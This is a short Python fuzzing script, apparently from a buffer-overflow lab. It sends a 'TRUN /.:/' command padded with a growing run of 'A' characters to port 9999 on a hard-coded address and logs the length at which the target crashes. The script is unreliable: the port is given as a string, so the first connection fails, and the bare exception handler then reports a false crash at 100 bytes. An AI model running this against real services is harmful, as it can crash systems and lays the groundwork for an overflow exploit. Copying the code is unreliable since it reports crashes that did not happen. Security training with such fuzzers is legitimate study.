#!/usr/bin/python
import sys , socket
from time import sleep
#what char I want to fill buffer with
buffer = "A" * 100
#Ip addr target
ipnum='192.168.1.1'
#Target port
portnum='9999'
#command we found spiking
cmd='TRUN /.:/'

while True:
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ipnum,portnum))

        s.send((cmd+ buffer))
        s.close()
        sleep(1)
		#incrament  char  everytime we reconnect
        buffer = buffer + "A"*100
	#Find out where command crashed
    except:
        print("Fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()